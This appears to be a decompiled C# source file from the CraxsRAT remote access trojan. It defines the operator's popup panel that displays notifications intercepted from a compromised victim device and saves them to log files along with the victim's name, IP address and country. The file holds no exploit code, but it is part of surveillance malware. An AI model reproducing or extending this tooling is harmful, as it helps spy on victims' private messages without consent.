using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Craxspopup : Form
{
	private IContainer components;

	[AccessedThroughProperty("checkbutton")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _checkbutton;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public Client ClassClient;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notifitext")]
	internal virtual TextBox notifitext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon checkbutton
	{
		[CompilerGenerated]
		get
		{
			return _checkbutton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Checkbutton_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _checkbutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_checkbutton = value;
			drakeUIButtonIcon = _checkbutton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolTips")]
	internal virtual DrakeUIToolTip ToolTips
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.Craxspopup));
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.checkbutton = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.notifitext = new System.Windows.Forms.TextBox();
		this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.Panel1.SuspendLayout();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.Panel1.BackColor = System.Drawing.Color.Transparent;
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Controls.Add(this.checkbutton);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(487, 133);
		this.Panel1.TabIndex = 0;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(320, 96);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 15;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(72, 30);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61544;
		this.DrakeUIButtonIcon2.TabIndex = 3;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon2, "Hide");
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(242, 96);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(72, 30);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.StyleCustomMode = true;
		this.DrakeUIButtonIcon1.Symbol = 61639;
		this.DrakeUIButtonIcon1.TabIndex = 2;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon1, "Save");
		this.checkbutton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkbutton.FillColor = System.Drawing.Color.Black;
		this.checkbutton.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkbutton.Location = new System.Drawing.Point(398, 96);
		this.checkbutton.Name = "checkbutton";
		this.checkbutton.Radius = 15;
		this.checkbutton.RectColor = System.Drawing.Color.SkyBlue;
		this.checkbutton.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.checkbutton.Size = new System.Drawing.Size(72, 30);
		this.checkbutton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkbutton.Symbol = 61453;
		this.checkbutton.TabIndex = 1;
		this.ToolTips.SetToolTip(this.checkbutton, "Clear & Close");
		this.Panel2.BackColor = System.Drawing.Color.Transparent;
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel2.Location = new System.Drawing.Point(0, 133);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(17, 287);
		this.Panel2.TabIndex = 1;
		this.Panel3.BackColor = System.Drawing.Color.Transparent;
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel3.Location = new System.Drawing.Point(470, 133);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(17, 287);
		this.Panel3.TabIndex = 2;
		this.Panel4.BackColor = System.Drawing.Color.Transparent;
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(17, 399);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(453, 21);
		this.Panel4.TabIndex = 3;
		this.Panel5.BackColor = System.Drawing.Color.Black;
		this.Panel5.Controls.Add(this.notifitext);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(17, 133);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(453, 266);
		this.Panel5.TabIndex = 4;
		this.notifitext.BackColor = System.Drawing.Color.Black;
		this.notifitext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.notifitext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.notifitext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.notifitext.ForeColor = System.Drawing.Color.SkyBlue;
		this.notifitext.Location = new System.Drawing.Point(0, 0);
		this.notifitext.Margin = new System.Windows.Forms.Padding(4);
		this.notifitext.Multiline = true;
		this.notifitext.Name = "notifitext";
		this.notifitext.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.notifitext.Size = new System.Drawing.Size(453, 266);
		this.notifitext.TabIndex = 2;
		this.notifitext.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.ToolTips.BackColor = System.Drawing.Color.Black;
		this.ToolTips.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolTips.OwnerDraw = true;
		this.ToolTips.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.DarkRed;
		this.BackgroundImage = (System.Drawing.Image)resources.GetObject("$this.BackgroundImage");
		this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		base.ClientSize = new System.Drawing.Size(487, 420);
		base.Controls.Add(this.Panel5);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		this.DoubleBuffered = true;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "craxsnotification";
		this.Text = "craxsnotification";
		this.Panel1.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel5.PerformLayout();
		base.ResumeLayout(false);
	}

	public Craxspopup()
	{
		base.Load += Craxsnotification_Load;
		base.Deactivate += Craxsnotification_Deactivate;
		InitializeComponent();
	}

	private void Craxsnotification_Load(object sender, EventArgs e)
	{
		base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
		BackColor = Color.DarkRed;
		base.TransparencyKey = Color.SkyBlue;
		if (ClassClient != null)
		{
			if (ClassClient.Notifications.Count() > 0)
			{
				notifitext.Text = "Notifications Monitor...\r\n";
				string[] notifications = ClassClient.Notifications;
				foreach (string text in notifications)
				{
					try
					{
						if (text != null && text.Length > 0)
						{
							TextBox textBox;
							(textBox = notifitext).Text = textBox.Text + text + "\r\n--------------------";
						}
					}
					catch (Exception)
					{
					}
				}
			}
			else
			{
				notifitext.Text += "No Notifications ...";
			}
		}
		ClassClient.isnewnotifi = false;
	}

	private void DrakeUIButton1_Click(object sender, EventArgs e)
	{
	}

	private void Craxsnotification_Deactivate(object sender, EventArgs e)
	{
		Close();
	}

	private void Checkbutton_Click(object sender, EventArgs e)
	{
		notifitext.Text = "";
		ClassClient.Notifications = new string[251];
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(notifitext.Text))
		{
			CraxsAlert.Showinformation("No log found to save");
			return;
		}
		try
		{
			if (!Directory.Exists(ClassClient.FolderUSER + "\\Notificatios"))
			{
				Directory.CreateDirectory(ClassClient.FolderUSER + "\\Notificatios");
			}
			string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
			if (!File.Exists(ClassClient.FolderUSER + "\\Notificatios\\" + text))
			{
				File.Create(ClassClient.FolderUSER + "\\Notificatios\\" + text).Dispose();
				File.AppendAllText(ClassClient.FolderUSER + "\\Notificatios\\" + text, "Client Name: " + ClassClient.ClientName + "\r\nClient IP: " + ClassClient.ClientAddressIP + "\r\nCountry: " + ClassClient.Country + "\r\nDate :" + DateTime.Now.ToString() + "\r\n----------------------------------------\r\n");
			}
			File.AppendAllText(ClassClient.FolderUSER + "\\Notificatios\\" + text, text + notifitext.Text + "\r\n");
			Process.Start(ClassClient.FolderUSER + "\\Notificatios");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
